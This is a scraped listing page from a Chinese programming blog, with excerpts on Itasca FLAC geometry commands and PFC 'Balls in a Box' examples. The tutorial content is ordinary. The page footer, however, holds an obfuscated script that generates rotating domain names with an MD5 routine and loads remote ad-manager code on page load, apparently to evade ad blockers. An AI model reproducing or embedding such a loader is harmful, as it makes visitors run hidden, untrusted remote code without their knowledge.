几何系统允许用户创建、导入和导出几何数据。这些数据可以用各种方式与模型互动。这些数据可以用范围逻辑作为过滤器，也可以用绘图作为可视化的辅助工具。FISH的额外变量和组名可以分配给几何数据。FISH可以用来创建和操作数据。几何数据被组织成几何集，它是节点、边和多边形的命名集合。
几何对象的创建不需要一个域，因为它们不是模型组件。几何导入命令用于从文件中导入几何数据，该文件可以是.stl、.dxf或Itasca几何格式。(可以用ai矢量绘图软件绘制，可以输出为stl或者dxf)
生成多边形：geometry polygon
①edge 边
②node 点
③输入位置矢量
④外部导入
在plot中的geometry中查看
new ;geometry node id 1 -1 -1 ;geometry node id 2 1 -1 ;geometry node id 3 2 0 ;geometry node id 4 1 1 ;geometry node id 5 -1 1 ;geometry node id 6 -2 0 ;;geometry polygon nodes 1 2 3 4 5 6 ;geometry edge id 1 node 1 node 2 ;geometry edge id 2 node 2 node 3 ;geometry edge id 3 node 3 node 4 ;geometry edge id 4 node 4 node 5 ;geometry edge id 5 node 5 node 6 ;geometry edge id 6 node 6 node 1 ; ;geometry polygon edges 1 2 3 4 5 6 ;geometry polygon positions -1 -1 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7eed56e07e9d0612c515c41c1e89e7ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afdad2953f43807ee3b1ccf4e1f5447d/" rel="bookmark">
			PFCdocumentation_ PFC examples
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
PFC examples
Balls in a Box
Clumps in a Box
Attributes and Properties
PFC examples Balls in a Box 模拟了 30 个在盒子中相互作用的球。
The one-wall keyword is given to force all generated facets to belong to the same wall, as opposed to creating one wall for each face of the box. PFC要求球具有非零密度，以便求解球的运动方程。一 如果存在密度为零的球，则在循环序列开始时发生错误。
; fname: cmlinear_simple.p3dat ; ; Exercise the Linear contact model ;============================================================================== model new model title 'Balls in a box' ; Set the domain extent指定属性域 model domain extent -10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afdad2953f43807ee3b1ccf4e1f5447d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/57/">«</a>
	<span class="pagination__item pagination__item--current">58/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/59/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>